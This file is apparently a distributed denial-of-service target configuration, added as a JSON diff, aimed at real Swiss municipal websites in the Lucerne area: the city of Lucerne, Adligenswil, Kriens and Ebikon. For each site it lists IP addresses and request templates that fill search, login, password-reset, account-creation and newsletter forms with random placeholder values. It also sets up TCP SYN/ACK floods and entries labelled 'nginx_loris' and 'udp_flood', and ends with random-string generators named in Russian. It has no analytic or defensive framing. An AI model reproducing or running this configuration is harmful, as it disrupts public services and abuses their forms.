@@ -1,0 +1,979 @@
+{
+    "targets": [
+        {
+            "target_id": "678f348b8823a512f285809d",
+            "request_id": "678f348b8823a512f285809e",
+            "host": "www.stadtluzern.ch",
+            "ip": "195.65.10.20",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/suche/quicksearch",
+            "body": {
+                "type": "str",
+                "value": "query=$_1&maxRows=7&filters%5BentityType%5D%5B%5D=aggThemaContaktnetbereiche&filters%5BentityType%5D%5B%5D=aggThemaContaktnetenbereiche&filters%5BentityType%5D%5B%5D=aggThemaContaktnetfrbereiche&filters%5BentityType%5D%5B%5D=aggThemaContaktnetitbereiche&filters%5BentityType%5D%5B%5D=aggThemaLebensthemenbereiche&filters%5BentityType%5D%5B%5D=aggThemaThemenbereiche&filters%5BentityType%5D%5B%5D=aggThemaDynprojektbereiche&filters%5BentityType%5D%5B%5D=dienst&filters%5BentityType%5D%5B%5D=behoerde&filters%5BentityType%5D%5B%5D=departement&filters%5BentityType%5D%5B%5D=freieSeite&filters%5BentityType%5D%5B%5D=onlinedienst"
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f348b8823a512f285809d",
+            "request_id": "678f348b8823a512f285809f",
+            "host": "www.stadtluzern.ch",
+            "ip": "195.65.10.20",
+            "type": "http2",
+            "method": "GET",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/suche?query=$_1",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f348b8823a512f285809d",
+            "request_id": "678f348b8823a512f28580a0",
+            "host": "www.stadtluzern.ch",
+            "ip": "195.65.10.20",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/login",
+            "body": {
+                "type": "str",
+                "value": "_username=$_1%40gmail.com&_password=$_1&_csrf_token=4b63c5683e54fa7b28b714e2e9.2RsmfKsQ3MbI4qo3L6k43QLzxBAtaBHqCoCnlFgHX5A.vyxIOs5krL-k0uZBQ8R-iUmF8kEVLHW4YMzrrDo_DcftKx4J-kXsiI-u7w"
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f348b8823a512f285809d",
+            "request_id": "678f348b8823a512f28580a1",
+            "host": "www.stadtluzern.ch",
+            "ip": "195.65.10.20",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/profile/password/reset",
+            "body": {
+                "type": "str",
+                "value": "forgot_password%5Bemail%5D=$_1%40gmail.com&forgot_password%5Bcaptcha%5D=95ca557eb5891816657c578ab56bd026a7075908d67088b7d9c531a8b637f7ba.Z47FagAAAAEAAAABAQwzegAAAAAAAAAAoRaj50T%2BqUI%3D.AAAAAPdrAQABAAAAHwgBAAIAAAAHMwAAAwAAAKEXAAAEAAAAqkEAAAUAAAB7TgEABgAAAAhLAAAHAAAAwkoAAAgAAAAaHgAACQAAALgDAAAKAAAAXhYBAAsAAACS2AAADAAAANFiAAANAAAAIUwAAA4AAADqpAAADwAAAEMbAAAQAAAAFKsAABEAAACP4AAAEgAAAK4vAQATAAAAn00AABQAAAA5FgAAFQAAAIkHAAAWAAAAjSUAABcAAAC%2FUAAAGAAAAC8wAAAZAAAATyoAABoAAABWugEAGwAAALQvAAAcAAAAc1oBAB0AAAB%2FKgAAHgAAAJEFAAAfAAAAFg0AACAAAAAdzgEAIQAAAMFsAAAiAAAA54AAACMAAACzUAAAJAAAAFwKAAAlAAAAwwwAACYAAADdDwAAJwAAAJQ2AAAoAAAABwIAACkAAAAgFQAAKgAAALoCAAArAAAAlAwAACwAAABdBgEALQAAAGcBAAAuAAAAAnABAC8AAACKfAAAMAAAAPYcAAAxAAAAUDwAADIAAAA4AwAA.AgAA&forgot_password%5B_token%5D=a43e9fb04455704a020d7c9362.eegU54ZQnoliHmgSxTCPbKgAgjQdRsSGwGXpijpu2EM.H65HqdQ91dFTVw5wjWbqOPBtxwFrI57-gRC9wUgejQYppGOK0BLx3AgnCw"
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f348b8823a512f285809d",
+            "request_id": "678f348b8823a512f28580a2",
+            "host": "www.stadtluzern.ch",
+            "ip": "195.65.10.20",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/profile/create",
+            "body": {
+                "type": "str",
+                "value": "create_profile%5Bemail%5D=$_1%40gmail.com&create_profile%5Bpassword%5D%5Bfirst%5D=qwerty&create_profile%5Bpassword%5D%5Bsecond%5D=qwerty&create_profile%5Bcaptcha%5D=b1348faaa9aebe2469282ee93c449aa470ea47d38cae97d068f5d050ba3a021c.Z47FvwAAAAEAAAABAQwzegAAAAAAAAAAY5OQZm3pTPc%3D.AAAAAPOuAAABAAAAKQEAAAIAAABbdwAAAwAAAO%2FAAAAEAAAApx8AAAUAAADwCQAABgAAANymAAAHAAAA9bkAAAgAAABgHgAACQAAADElAAAKAAAAfykBAAsAAACDPgAADAAAAI4pAAANAAAAeF8AAA4AAAC2RwEADwAAAJA5AAAQAAAAB%2FUAABEAAAA0NgAAEgAAAMXYAAATAAAAA%2BsAABQAAADsGwAAFQAAAC6BAAAWAAAAlCUAABcAAADGdAAAGAAAAAMcAAAZAAAABj0AABoAAAD9yAAAGwAAAJS1AAAcAAAA%2FvwAAB0AAAApEAAAHgAAAP7iAQAfAAAAwm8AACAAAAA7lQAAIQAAAGzaAgAiAAAAnuwAACMAAAAa1gAAJAAAAA9TAQAlAAAAW%2FwAACYAAACJoQAAJwAAAHYRAAAoAAAAS0gAACkAAAAqDQAAKgAAALmeAAArAAAAtkQAACwAAACCKgAALQAAACKGAAAuAAAACIUAAC8AAAClAAAAMAAAADUUAAAxAAAALX4AADIAAAB2QQEA.AgAA&create_profile%5B_token%5D=36941972f1f87137e85341.VS9wjaZc7rZfpePr2vS0SpmT_IuBpXJl85cHxPRSXTk.M2kjw_Qxpe5u7IWJkqLRHsH-ub73wCgdsuJTj4YiCHwFYwfg8B6B4zWcgA"
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f348b8823a512f285809d",
+            "request_id": "678f348b8823a512f28580a3",
+            "host": "www.stadtluzern.ch",
+            "ip": "195.65.10.20",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/aktuelles/virtuelledienste",
+            "body": {
+                "type": "str",
+                "value": "virtuelle_dienste_newsletter_subscribe%5Bemail%5D=$_1%40gmailcom&virtuelle_dienste_newsletter_subscribe%5B_token%5D=c574e26a0762a82e06e.kp1zP6GV9Bw0ZCxYj19abjmHs__mYsSSrHI0hohppYk._vdeXMbQl2tAE14T5zozNFTM5JO5UY3k9iJ99eYqwvn1_z9w4MKRTWI0aQ"
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f348b8823a512f285809d",
+            "request_id": "678f348b8823a512f28580a4",
+            "host": "www.stadtluzern.ch",
+            "ip": "195.65.10.20",
+            "type": "tcp",
+            "method": "syn",
+            "port": 80,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f348b8823a512f285809d",
+            "request_id": "678f348b8823a512f28580a5",
+            "host": "www.stadtluzern.ch",
+            "ip": "195.65.10.20",
+            "type": "tcp",
+            "method": "ack",
+            "port": 80,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f348b8823a512f285809d",
+            "request_id": "678f348b8823a512f28580a6",
+            "host": "www.stadtluzern.ch",
+            "ip": "195.65.10.20",
+            "type": "tcp",
+            "method": "syn_ack",
+            "port": 80,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f348b8823a512f285809d",
+            "request_id": "678f348b8823a512f28580a7",
+            "host": "www.stadtluzern.ch",
+            "ip": "195.65.10.20",
+            "type": "tcp",
+            "method": "syn",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f348b8823a512f285809d",
+            "request_id": "678f348b8823a512f28580a8",
+            "host": "www.stadtluzern.ch",
+            "ip": "195.65.10.20",
+            "type": "tcp",
+            "method": "ack",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f348b8823a512f285809d",
+            "request_id": "678f348b8823a512f28580a9",
+            "host": "www.stadtluzern.ch",
+            "ip": "195.65.10.20",
+            "type": "tcp",
+            "method": "syn_ack",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f348b8823a512f285809d",
+            "request_id": "678f348b8823a512f28580aa",
+            "host": "www.stadtluzern.ch",
+            "ip": "195.65.10.20",
+            "type": "nginx_loris",
+            "method": "udp_flood",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f358c8823a512f28580dd",
+            "request_id": "678f358c8823a512f28580de",
+            "host": "www.adligenswil.ch",
+            "ip": "193.135.58.34",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/service/suchresultate.html/9",
+            "body": {
+                "type": "str",
+                "value": "searchParams.entity=all&searchParams.query=$_1&searchParams.exactMatch=false"
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f358c8823a512f28580dd",
+            "request_id": "678f358c8823a512f28580df",
+            "host": "www.adligenswil.ch",
+            "ip": "193.135.58.34",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/route/messenger-subscription-savemember/backPageId/335/cbtoken/cbdataC717AED3865FABDAD97B3D9B8B72A8E6",
+            "body": {
+                "type": "str",
+                "value": "formfield9034733201=52&formfield8303207872=18&formfield8227228483=1736414543862&formfield3852057474=&subscription.member.id=&subscription.member.salutation=1&subscription.member.firstname=$_1&subscription.member.lastname=$_1&subscription.member.email=$_1%40gmail.com&subscription.config.389.1.id=0&subscription.config.389.1.html=1&subscription.crontime.time=09%3A00&subscribe="
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f358c8823a512f28580dd",
+            "request_id": "678f358c8823a512f28580e0",
+            "host": "www.adligenswil.ch",
+            "ip": "193.135.58.34",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/adligenswil/aktuelles/newsletter-archiv.html/338",
+            "body": {
+                "type": "str",
+                "value": "transmissionSearch.text=$_1"
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f358c8823a512f28580dd",
+            "request_id": "678f358c8823a512f28580e1",
+            "host": "www.adligenswil.ch",
+            "ip": "193.135.58.34",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/service/anlaesse-termine.html/19",
+            "body": {
+                "type": "str",
+                "value": "eventSearchParams.query=$_1&eventSearchParams.dateFrom=&eventSearchParams.dateTo="
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f358c8823a512f28580dd",
+            "request_id": "678f358c8823a512f28580e2",
+            "host": "www.adligenswil.ch",
+            "ip": "193.135.58.34",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/route/cms-index-renderAjaxBlock",
+            "body": {
+                "type": "str",
+                "value": "id=19&contentTypeHTML=1&processOutputContent=1&blockid=2782&eventsjsRequest=1&eventspage=$_2"
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f358c8823a512f28580dd",
+            "request_id": "678f358c8823a512f28580e3",
+            "host": "www.adligenswil.ch",
+            "ip": "193.135.58.34",
+            "type": "tcp",
+            "method": "syn",
+            "port": 80,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f358c8823a512f28580dd",
+            "request_id": "678f358c8823a512f28580e4",
+            "host": "www.adligenswil.ch",
+            "ip": "193.135.58.34",
+            "type": "tcp",
+            "method": "ack",
+            "port": 80,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f358c8823a512f28580dd",
+            "request_id": "678f358c8823a512f28580e5",
+            "host": "www.adligenswil.ch",
+            "ip": "193.135.58.34",
+            "type": "tcp",
+            "method": "syn_ack",
+            "port": 80,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f358c8823a512f28580dd",
+            "request_id": "678f358c8823a512f28580e6",
+            "host": "www.adligenswil.ch",
+            "ip": "193.135.58.34",
+            "type": "tcp",
+            "method": "syn",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f358c8823a512f28580dd",
+            "request_id": "678f358c8823a512f28580e7",
+            "host": "www.adligenswil.ch",
+            "ip": "193.135.58.34",
+            "type": "tcp",
+            "method": "ack",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f358c8823a512f28580dd",
+            "request_id": "678f358c8823a512f28580e8",
+            "host": "www.adligenswil.ch",
+            "ip": "193.135.58.34",
+            "type": "tcp",
+            "method": "syn_ack",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f358c8823a512f28580dd",
+            "request_id": "678f358c8823a512f28580e9",
+            "host": "www.adligenswil.ch",
+            "ip": "193.135.58.34",
+            "type": "nginx_loris",
+            "method": "udp_flood",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f36848823a512f2858113",
+            "request_id": "678f36848823a512f2858114",
+            "host": "www.stadt-kriens.ch",
+            "ip": "193.135.58.108",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/service-seiten.page/76",
+            "body": {
+                "type": "str",
+                "value": "searchParams.entity=all&searchParams.query=$_1&searchParams.exactMatch=false"
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f36848823a512f2858113",
+            "request_id": "678f36848823a512f2858115",
+            "host": "www.stadt-kriens.ch",
+            "ip": "193.135.58.108",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/route/cms-index-renderAjaxBlock",
+            "body": {
+                "type": "str",
+                "value": "searchParams.exactMatch=false&searchParams.query=$_1&id=1536&searchParams.collection=1&contentTypeHTML=1&processOutputContent=1&blockid=27827&crawlerjsRequest=1&crawlerpage=$_2"
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f36848823a512f2858113",
+            "request_id": "678f36848823a512f2858116",
+            "host": "www.stadt-kriens.ch",
+            "ip": "193.135.58.108",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/politik-und-verwaltung/aktuelle-nachrichten.page/45/newsarchive/1",
+            "body": {
+                "type": "str",
+                "value": "newsSearchParams.query=$_1&newsSearchParams.category=-1&newsSearchParams.dateFrom=&newsSearchParams.dateTo="
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f36848823a512f2858113",
+            "request_id": "678f36848823a512f2858117",
+            "host": "www.stadt-kriens.ch",
+            "ip": "193.135.58.108",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/agenda.page/5",
+            "body": {
+                "type": "str",
+                "value": "eventSearchParams.category=-1&eventSearchParams.query=$_1&eventSearchParams.dateFrom=&eventSearchParams.dateTo="
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f36848823a512f2858113",
+            "request_id": "678f36848823a512f2858118",
+            "host": "www.stadt-kriens.ch",
+            "ip": "193.135.58.108",
+            "type": "tcp",
+            "method": "syn",
+            "port": 80,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f36848823a512f2858113",
+            "request_id": "678f36848823a512f2858119",
+            "host": "www.stadt-kriens.ch",
+            "ip": "193.135.58.108",
+            "type": "tcp",
+            "method": "ack",
+            "port": 80,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f36848823a512f2858113",
+            "request_id": "678f36848823a512f285811a",
+            "host": "www.stadt-kriens.ch",
+            "ip": "193.135.58.108",
+            "type": "tcp",
+            "method": "syn_ack",
+            "port": 80,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f36848823a512f2858113",
+            "request_id": "678f36848823a512f285811b",
+            "host": "www.stadt-kriens.ch",
+            "ip": "193.135.58.108",
+            "type": "tcp",
+            "method": "syn",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f36848823a512f2858113",
+            "request_id": "678f36848823a512f285811c",
+            "host": "www.stadt-kriens.ch",
+            "ip": "193.135.58.108",
+            "type": "tcp",
+            "method": "ack",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f36848823a512f2858113",
+            "request_id": "678f36848823a512f285811d",
+            "host": "www.stadt-kriens.ch",
+            "ip": "193.135.58.108",
+            "type": "tcp",
+            "method": "syn_ack",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f36848823a512f2858113",
+            "request_id": "678f36848823a512f285811e",
+            "host": "www.stadt-kriens.ch",
+            "ip": "193.135.58.108",
+            "type": "nginx_loris",
+            "method": "udp_flood",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f37218823a512f285813f",
+            "request_id": "678f37218823a512f2858140",
+            "host": "www.ebikon.ch",
+            "ip": "194.182.161.23",
+            "type": "http2",
+            "method": "GET",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/search?q=$_1",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f37218823a512f285813f",
+            "request_id": "678f37218823a512f2858141",
+            "host": "www.ebikon.ch",
+            "ip": "194.182.161.23",
+            "type": "http2",
+            "method": "GET",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/search/suggest?q=$_1",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f37218823a512f285813f",
+            "request_id": "678f37218823a512f2858142",
+            "host": "www.ebikon.ch",
+            "ip": "194.182.161.23",
+            "type": "http2",
+            "method": "GET",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/news?filter_years=202$_3",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f37218823a512f285813f",
+            "request_id": "678f37218823a512f2858143",
+            "host": "www.ebikon.ch",
+            "ip": "194.182.161.23",
+            "type": "http2",
+            "method": "POST",
+            "port": 443,
+            "use_ssl": true,
+            "path": "/auth/login?skip=0&to=%2Ftopics%2Fverwaltung-wirtschaft",
+            "body": {
+                "type": "str",
+                "value": "------WebKitFormBoundaryozYX7cNXplV2yNG4\nContent-Disposition: form-data; name=\"csrf_token\"\n\n20250120233106##473ceb539ef95670adcce1ac748357fa74ccb451\n------WebKitFormBoundaryozYX7cNXplV2yNG4\nContent-Disposition: form-data; name=\"username\"\n\n$_1@gmail.com\n------WebKitFormBoundaryozYX7cNXplV2yNG4\nContent-Disposition: form-data; name=\"password\"\n\n$_1\n------WebKitFormBoundaryozYX7cNXplV2yNG4\nContent-Disposition: form-data; name=\"yubikey\"\n\n$_1\n------WebKitFormBoundaryozYX7cNXplV2yNG4--\n\npost: /auth/request-password?skip=0&to=%2Ftopics%2Fverwaltung-wirtschaft\n------WebKitFormBoundarycbysHYqHTCHAguQH\nContent-Disposition: form-data; name=\"csrf_token\"\n\n20250120233158##241034e00985d4907f94e7257842d46005a06a85\n------WebKitFormBoundarycbysHYqHTCHAguQH\nContent-Disposition: form-data; name=\"email\"\n\n$_1@gmail.com\n------WebKitFormBoundarycbysHYqHTCHAguQH--"
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f37218823a512f285813f",
+            "request_id": "678f37218823a512f2858144",
+            "host": "www.ebikon.ch",
+            "ip": "194.182.161.23",
+            "type": "tcp",
+            "method": "syn",
+            "port": 22,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f37218823a512f285813f",
+            "request_id": "678f37218823a512f2858145",
+            "host": "www.ebikon.ch",
+            "ip": "194.182.161.23",
+            "type": "tcp",
+            "method": "ack",
+            "port": 22,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f37218823a512f285813f",
+            "request_id": "678f37218823a512f2858146",
+            "host": "www.ebikon.ch",
+            "ip": "194.182.161.23",
+            "type": "tcp",
+            "method": "syn",
+            "port": 80,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f37218823a512f285813f",
+            "request_id": "678f37218823a512f2858147",
+            "host": "www.ebikon.ch",
+            "ip": "194.182.161.23",
+            "type": "tcp",
+            "method": "ack",
+            "port": 80,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f37218823a512f285813f",
+            "request_id": "678f37218823a512f2858148",
+            "host": "www.ebikon.ch",
+            "ip": "194.182.161.23",
+            "type": "tcp",
+            "method": "syn_ack",
+            "port": 80,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f37218823a512f285813f",
+            "request_id": "678f37218823a512f2858149",
+            "host": "www.ebikon.ch",
+            "ip": "194.182.161.23",
+            "type": "tcp",
+            "method": "syn",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f37218823a512f285813f",
+            "request_id": "678f37218823a512f285814a",
+            "host": "www.ebikon.ch",
+            "ip": "194.182.161.23",
+            "type": "tcp",
+            "method": "ack",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f37218823a512f285813f",
+            "request_id": "678f37218823a512f285814b",
+            "host": "www.ebikon.ch",
+            "ip": "194.182.161.23",
+            "type": "tcp",
+            "method": "syn_ack",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        },
+        {
+            "target_id": "678f37218823a512f285813f",
+            "request_id": "678f37218823a512f285814c",
+            "host": "www.ebikon.ch",
+            "ip": "194.182.161.23",
+            "type": "nginx_loris",
+            "method": "udp_flood",
+            "port": 443,
+            "use_ssl": true,
+            "path": "",
+            "body": {
+                "type": "str",
+                "value": ""
+            },
+            "headers": null
+        }
+    ],
+    "randoms": [
+        {
+            "name": "\u0422\u0435\u043b\u0435\u0444\u043e\u043d",
+            "id": "62d8286fddcbb37b0c77c87f",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 11,
+            "max": 11
+        },
+        {
+            "name": "\u0412\u0441\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044b 6-12",
+            "id": "62d8fccfb44b5774ee96ec0a",
+            "digit": true,
+            "upper": true,
+            "lower": true,
+            "min": 6,
+            "max": 12
+        },
+        {
+            "name": "\u041f\u0430\u0433\u0438\u043d\u0430\u0446\u0438\u044f (2 \u0441\u0442\u0440)",
+            "id": "62d90c4fb44b5774ee96ec16",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 1,
+            "max": 2
+        },
+        {
+            "name": "\u041f\u0430\u0433\u0438\u043d\u0430\u0446\u0438\u044f (1 \u0441\u0442\u0440)",
+            "id": "62d90e74b44b5774ee96ec1c",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 1,
+            "max": 1
+        },
+        {
+            "name": "\u041a\u043e\u0434 (9)",
+            "id": "62d912fbb44b5774ee96ec1f",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 9,
+            "max": 9
+        },
+        {
+            "name": "\u0427\u0438\u0441\u043b\u043e (2)",
+            "id": "62d91885b44b5774ee96ec28",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 2,
+            "max": 2
+        },
+        {
+            "name": "\u041f\u0430\u0433\u0438\u043d\u0430\u0446\u0438\u044f (3 \u0441\u0442\u0440)",
+            "id": "62d91990b44b5774ee96ec2f",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 1,
+            "max": 3
+        },
+        {
+            "name": "\u0427\u0438\u0441\u043b\u043e 4",
+            "id": "62e262e59ea7e45b2ab4e57c",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 4,
+            "max": 4
+        },
+        {
+            "name": "\u0427\u0438\u0441\u043b\u043e (8)",
+            "id": "62e3a6ed89e76a5c1fd7cac7",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 8,
+            "max": 8
+        },
+        {
+            "name": "\u0427\u0438\u0441\u043b\u043e (7)",
+            "id": "62e3a7d589e76a5c1fd7cde2",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 7,
+            "max": 7
+        },
+        {
+            "name": "\u043a\u043e\u0434(6)",
+            "id": "62ea3bc2affd481da97548d3",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 6,
+            "max": 6
+        },
+        {
+            "name": "\u0447\u0438\u0441\u043b\u043e 3",
+            "id": "6305d781a419f490fd723fe4",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 3,
+            "max": 3
+        },
+        {
+            "name": "\u0427\u0438\u0441\u043b\u043e 10",
+            "id": "6305d99aa419f490fd723ff0",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 10,
+            "max": 10
+        },
+        {
+            "name": "\u0411\u043e\u043b\u044c\u0448\u0430\u044f \u0431\u0443\u043a\u0432\u0430 1",
+            "id": "637b3768cd01228f80cf1a15",
+            "digit": false,
+            "upper": true,
+            "lower": false,
+            "min": 1,
+            "max": 1
+        },
+        {
+            "name": "16 \u0447\u0438\u0441\u043b\u043e",
+            "id": "637dd156a04c19b9931f7fc5",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 16,
+            "max": 16
+        },
+        {
+            "name": "\u0447\u0438\u0441\u043b\u043e 5",
+            "id": "63c7a25ff4f35f8e67cc5a4d",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 5,
+            "max": 5
+        },
+        {
+            "name": "\u041f\u0440\u043e\u043f\u0438\u0441\u043d\u044b\u0435 \u0431\u0443\u043a\u0432\u044b 1-3",
+            "id": "64ba474f308087d8a5524d2b",
+            "digit": false,
+            "upper": true,
+            "lower": false,
+            "min": 1,
+            "max": 3
+        },
+        {
+            "name": "\u0421\u043b\u043e\u0432\u043e",
+            "id": "64ba4811308087d8a5524d5c",
+            "digit": false,
+            "upper": true,
+            "lower": true,
+            "min": 2,
+            "max": 9
+        },
+        {
+            "name": "\u0427\u0438\u0441\u043b\u043e \u0438 \u0411\u0443\u043a\u0432\u0430",
+            "id": "64ba747c308087d8a5525aef",
+            "digit": true,
+            "upper": true,
+            "lower": false,
+            "min": 1,
+            "max": 2
+        },
+        {
+            "name": "\u0427\u0438\u0441\u043b\u043e 16",
+            "id": "64bab375f0546def3d535409",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 16,
+            "max": 26
+        },
+        {
+            "name": "\u0427\u0438\u0441\u043b\u043e 9",
+            "id": "64bfc5ea02ebca2589b758b4",
+            "digit": true,
+            "upper": false,
+            "lower": false,
+            "min": 9,
+            "max": 9
+        }
+    ]
+}
